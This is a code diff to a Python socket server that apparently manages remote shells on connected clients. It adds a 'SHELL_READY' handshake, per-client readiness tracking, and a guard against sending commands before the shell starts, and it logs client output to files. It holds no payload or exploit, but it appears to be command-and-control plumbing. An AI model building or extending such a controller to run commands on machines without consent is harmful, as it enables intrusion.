@@ -17,6 +17,7 @@ connected_clients = {}  # { client_id: { "conn", "addr", "userinfo" } }
 client_locks = {}       # { client_id: threading.Lock() }
 client_responses = {}   # If storing in-memory responses
 shell_state = {}
+shell_ready = {}  # Track if the shell is ready for each client
 # We won't keep a local "client_counter" because we'll rely on the JSON file to track "last_id"
 
 def load_client_map():
@@ -101,30 +102,22 @@ def add_new_connection(conn, addr):
 
 def client_receiver(client_id, conn):
     """
-    Continuously reads data from this client's socket and appends to logs/client_<client_id>.log.
+    Receives messages from the client and writes them to the log file.
+    Also checks for SHELL_READY handshake.
     """
-    log_path = os.path.join(LOG_DIR, f"client_{client_id}.log")
+    log_path = f"{LOG_DIR}/client_{client_id}.log"
     while True:
         try:
             data = conn.recv(4096)
             if not data:
-                print(f"[-] Client {client_id} disconnected")
                 break
-            decoded = data.decode(errors="ignore")
-            print(f"[>] Received from client {client_id}: {decoded}")
-
-            # Append to the client's log file
-            with client_locks[client_id]:
-                with open(log_path, "a", encoding="utf-8") as f:
-                    f.write(decoded)
-            
-            # If you want in-memory logs:
-            # with lock:
-            #     timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-            #     client_responses[client_id][timestamp] = decoded
-
+            text = data.decode(errors="ignore")
+            if "SHELL_READY" in text:
+                shell_ready[client_id] = True
+            with open(log_path, "a", encoding="utf-8") as f:
+                f.write(text)
         except Exception as e:
-            print(f"[!] Error reading from client {client_id}: {e}")
+            print(f"[client_receiver] Error for client {client_id}: {e}")
             break
 
     # Remove from memory
@@ -143,6 +136,10 @@ def send_message(client_id, command):
             return f"Client {client_id} not found."
         conn = connected_clients[client_id]["conn"]
         shell_state[client_id] = True
+
+    # If the command is not 'start_shell', check if shell is ready
+    if command.strip() != "start_shell" and not shell_ready.get(client_id, False):
+        return f"Shell not ready for client {client_id}. Please wait for SHELL_READY."
 
     if not command.endswith("\n"):
         command += "\n"
